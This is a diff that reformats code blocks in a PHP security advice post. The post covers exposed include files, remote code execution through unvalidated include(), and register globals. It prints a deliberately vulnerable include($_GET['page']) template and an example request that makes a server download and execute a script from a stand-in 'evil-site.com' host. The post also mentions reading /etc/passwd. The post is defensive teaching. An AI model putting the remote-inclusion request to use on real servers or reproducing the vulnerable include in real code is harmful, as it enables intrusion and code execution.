@@ -16,7 +16,11 @@ Of course everyone knows that [security by obscurity is bad](http://en.wikipedia
 The number one rookie mistake is failing to give your PHP scripts a .php extension. This may seem obvious, but lots of people seem to like naming their files something like "functions.inc" or "MyClass.class", seemingly unaware that anyone can request those files and view the raw code.
 
 As well as giving files a correct extension you also consider moving them out of your web root anyway. You don't need them in there, and having them in a non-public path makes everything safer. If you don't want to rearrange your site structure then you could just use .htaccess to deny all requests to your include folder. In your-site.com/includes/.htaccess
-<pre lang="php">Deny from all</pre>
+
+```php
+Deny from all
+```
+
 Facebook recently had a [configuration](http://killersoft.com/randomstrings/2007/08/12/php-did-not-cause-facebook-code-leakage/) [issue](http://www.techcrunch.com/2007/08/11/facebook-source-code-leaked/) that caused their PHP files to be sent out as plain text. It only takes one small mistake to show the entire world the code base stored in your web root.
 
 ## Remote Code Execution
@@ -24,28 +28,38 @@ Facebook recently had a [configuration](http://killersoft.com/randomstrings/2007
 The last thing you ever want is to have an attacker run their own code on your servers. Unfortunately there are a few simple mistakes that could open your site up to this possibility.
 
 Watch what you include or require. Many people use include as a shortcut in their templates. For example
-<pre lang="php"><html>
+
+```php
+<html>
 <body>
 	<div class="header">...</div>
 	<?php include($_GET['page'] . '.php'); ?>
 </body> 	
-</html></pre>
+</html>
+```
+
 This is a major no-no. The first problem is that an attacker can use this vulnerability to have any file on your system output to them. `/etc/passwd`. PHP will also allow you to include files from a remote server. An attacker can use this "feature" against you a request to `http://www.your-site.com/index.php?page=``http://www.evil-site.com/malicious-script.php.txt` would force your server to download and execute code from the "evil-site.com" domain. Once that happens the user can attack your system by executing [shell functions](http://kestas.kuliukas.com/Webkit/).
 
 If you want to use the above pattern of templating then you can easily implement a white list of safe files.
-<pre lang="php"><?php
+
+```php
+<?php
 $page = $_GET['page'];
 $pages = array('index', 'about', '404', 'help');
 if (!in_array($page, $pages)) {
 	$page = '404';
 }
 include("$page.php");
-?></pre>
+?>
+```
 
 ## Register Globals
 
 In the early days of PHP, external variables ($_GET, $_POST) were expanded as variables directly into the global scope: a query string of "?a=foo" would create a variable called `$a` in your local scope. This is thanks to the register globals functionality. Although this could seem useful, it is [potentially dangerous](http://www.php.net/register_globals). You should always turn off register globals in php.ini. If you can't edit your php.ini then add the following to your .htaccess file
-<pre lang="php">php_value register_globals 0</pre>
+
+```php
+php_value register_globals 0
+```
 
 ## User Uploaded Files
 
